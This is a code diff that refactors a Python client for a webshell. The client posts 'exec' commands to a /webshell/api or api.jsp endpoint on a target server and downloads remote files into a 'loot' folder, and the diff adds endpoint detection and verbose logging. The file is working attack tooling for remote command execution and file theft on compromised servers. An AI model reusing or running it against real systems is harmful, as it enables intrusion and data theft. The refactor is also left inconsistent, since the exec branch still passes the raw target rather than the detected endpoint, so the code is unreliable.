@@ -48,10 +48,10 @@ def parseArgs():
     return parser.parse_args()
 
 
-def remote_exec(target, cmd, verbose=False):
+def remote_exec(api_endpoint, cmd, verbose=False):
     try:
         r = requests.post(
-            "%s/webshell/api" % target,
+            api_endpoint,
             data={
                 "action": "exec",
                 "cmd": cmd,
@@ -71,7 +71,7 @@ def remote_exec(target, cmd, verbose=False):
         print(e)
 
 
-def remote_download(target, remote_path, local_path="./loot/", verbose=False):
+def remote_download(api_endpoint, remote_path, local_path="./loot/", verbose=False):
     def b_filesize(content):
         l = len(content)
         units = ['B', 'kB', 'MB', 'GB', 'TB', 'PB']
@@ -82,7 +82,7 @@ def remote_download(target, remote_path, local_path="./loot/", verbose=False):
 
     #
     r = requests.post(
-        "%s/webshell/api" % target,
+        api_endpoint,
         data={
             "action": "download",
             "path": remote_path,
@@ -108,14 +108,24 @@ def remote_download(target, remote_path, local_path="./loot/", verbose=False):
         return False
 
 
-def detect_api_endpoint(target):
-    r = requests.post("%s/webshell/api" % target, data={})
+def detect_api_endpoint(target, verbose=False):
+    print("[+] Searching for valid API endpoints ...")
+    SERVLET_API = "%s/webshell/api" % target
+    JSP_API = "%s/webshell/api.jsp" % target
+
+    r = requests.post(SERVLET_API, data={})
+    if verbose:
+        print("  | [HTTP %03d] on %s" % (r.status_code, r.url))
+    
     if r.status_code == 200:
-        return "SERVLET_API"
+        return SERVLET_API
     else:
-        r = requests.post("%s/webshell/api.jsp" % target, data={})
+        r = requests.post(JSP_API, data={})
+        if verbose:
+            print("  | [HTTP %03d] on %s" % (r.status_code, r.url))
+
         if r.status_code == 200:
-            return "JSP_API"
+            return JSP_API
         else:
             return None
 
@@ -132,6 +142,7 @@ if __name__ == '__main__':
 
     if not options.target.startswith("https://") and not options.target.startswith("http://"):
         options.target = "http://" + options.target
+    options.target = options.target.rstrip('/')
 
     if options.insecure_tls:
         # Disable warings of insecure connection for invalid certificates
@@ -143,7 +154,7 @@ if __name__ == '__main__':
         except AttributeError:
             pass
 
-    api_endpoint = detect_api_endpoint(target=options.target)
+    api_endpoint = detect_api_endpoint(target=options.target, verbose=options.verbose)
 
     if api_endpoint is not None:
         print("[+] Using API endpoint '%s'" % api_endpoint)
@@ -161,8 +172,10 @@ if __name__ == '__main__':
                 if len(args) != 2 and len(args) != 3:
                     print("Usage: download <remotepath> [localpath]")
                 elif len(args) == 2:
-                    remote_download(options.target, remote_path=args[1])
+                    remote_download(api_endpoint, remote_path=args[1])
                 elif len(args) == 3:
-                    remote_download(options.target, remote_path=args[1], local_path=args[2])
+                    remote_download(api_endpoint, remote_path=args[1], local_path=args[2])
             else:
                 remote_exec(options.target, cmd, verbose=options.verbose)
+    else:
+        print("\n[!] No valid API endpoint detected, exitting...")
